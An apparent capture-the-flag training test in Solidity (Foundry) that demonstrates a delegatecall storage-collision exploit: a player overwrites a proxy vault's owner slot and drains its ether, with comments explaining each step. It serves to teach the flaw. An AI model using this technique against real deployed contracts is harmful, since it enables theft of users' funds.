// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Level5_Implementation, Level5_ProxyVault} from "../src/Level5_Delegatecall.sol";

contract Level5DelegatecallTest is Test {
    Level5_Implementation public implementation;
    Level5_ProxyVault public proxy;
    
    address public originalOwner = address(this);
    address public player = address(0x1337);

    function setUp() public {
        implementation = new Level5_Implementation();
        proxy = new Level5_ProxyVault{value: 0.05 ether}(address(implementation));
        
        vm.deal(player, 0 ether);
    }

    function test_StorageCollisionExploit() public {
        vm.startPrank(player);

        // 1. Before exploitation
        assertEq(proxy.owner(), originalOwner, "Initial owner is incorrect");
        assertEq(address(proxy).balance, 0.05 ether, "Initial vault balance is incorrect");
        
        // 2. Control: Direct call to implementation
        // Calling the implementation directly changes only the implementation's storage,
        // it DOES NOT change the proxy's owner.
        implementation.updateAddress(player);
        assertEq(implementation.vulnerableAddress(), player, "Implementation state didn't change");
        assertEq(proxy.owner(), originalOwner, "Direct call to implementation should not change proxy owner");
        
        // 3. Control: Direct call to withdraw fails
        vm.expectRevert("Not owner");
        proxy.withdraw(payable(player));

        // 4. Execute the Exploit via delegatecall
        // We prepare the calldata for updateAddress(address)
        bytes memory data = abi.encodeWithSignature("updateAddress(address)", player);
        
        // Call the proxy which delegatecalls to the implementation
        proxy.execute(data);

        // The delegatecall executes implementation code against proxy storage.
        // Implementation slot 0 (vulnerableAddress) was written to.
        // Proxy slot 0 (owner) was therefore overwritten!
        assertEq(proxy.owner(), player, "Storage collision failed to change owner");
        
        // Ensure proxy.implementation() remains unchanged (slot 1)
        assertEq(proxy.implementation(), address(implementation), "Implementation address was corrupted");

        // 5. Drain the vault
        proxy.withdraw(payable(player));

        assertEq(address(proxy).balance, 0, "Vault was not fully drained");
        assertTrue(proxy.isComplete(), "Challenge is not complete");
        assertEq(player.balance, 0.05 ether, "Player did not receive the stolen ETH");

        vm.stopPrank();
    }
}
